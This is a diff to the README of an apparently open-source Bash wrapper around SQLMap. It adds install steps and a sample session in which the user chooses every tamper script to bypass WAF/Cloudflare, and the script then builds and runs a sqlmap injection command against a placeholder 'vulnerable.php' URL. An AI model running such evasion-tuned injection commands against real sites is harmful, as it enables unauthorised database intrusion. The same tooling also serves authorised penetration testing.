@@ -41,4 +41,28 @@ The **Advanced SQLMap Automation Script** is a highly customizable Bash script d
    ```bash
    git clone https://github.com/shaid69/sqlmap-automation.git
    cd sqlmap-automation
+   chmod +x sqlmap_automation.sh
+   ./sqlmap_automation.sh
+
+   
+➤ Choose Request Type:
+  1. GET Request
+  2. POST Request
+Enter your choice (1 or 2): 1
+Enter the target URL: http://example.com/vulnerable.php?id=1
+➤ Enable Advanced Features?
+  1. Yes
+  2. No (Basic mode)
+Enter your choice (1 or 2): 1
+➤ Select Tamper Scripts to Bypass WAF/Cloudflare:
+  1. space2comment (Spaces to comments)
+  2. charunicodeencode (Encode payload to Unicode)
+  3. between (Use BETWEEN operator)
+  4. hexencode (Encode strings to Hexadecimal)
+  5. Use All Tamper Scripts
+Enter your choice (1-5): 5
+➤ Generated SQLMap Command:
+sqlmap -u "http://example.com/vulnerable.php?id=1" --tamper=space2comment,charunicodeencode,between,hexencode --random-agent --delay=2 --timeout=10 --retries=5
+Do you want to execute this command? (y/n): y
+Executing the command...
    
